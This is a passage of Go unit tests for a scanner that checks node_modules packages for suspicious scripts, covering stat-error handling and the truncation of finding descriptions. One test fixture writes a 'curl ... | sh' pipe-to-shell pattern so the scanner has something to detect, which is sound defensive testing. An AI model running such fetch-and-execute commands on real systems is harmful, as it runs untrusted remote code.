		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestAppendScannable_StatError(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "test.js"), `console.log("hi")`)

	origStat := OsStat
	defer func() { OsStat = origStat }()

	OsStat = func(name string) (os.FileInfo, error) {
		return nil, fmt.Errorf("injected stat error")
	}

	files := appendScannable(nil, dir)
	if len(files) != 0 {
		t.Errorf("expected 0 files with stat error, got %d", len(files))
	}
}

func TestScanDir_FindingDescriptionTruncated(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules")
	pkgDir := makePackage(t, nmDir, "long-match", "1.0.0")

	// Create a match that produces a long description.
	long := "curl " + strings.Repeat("x", 300) + " | sh"
	writeFile(t, filepath.Join(pkgDir, "run.sh"), long)

	findings, err := ScanDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}

	if len(findings[0].Description) > 210 {
		t.Errorf("description too long: %d chars", len(findings[0].Description))
	}
}
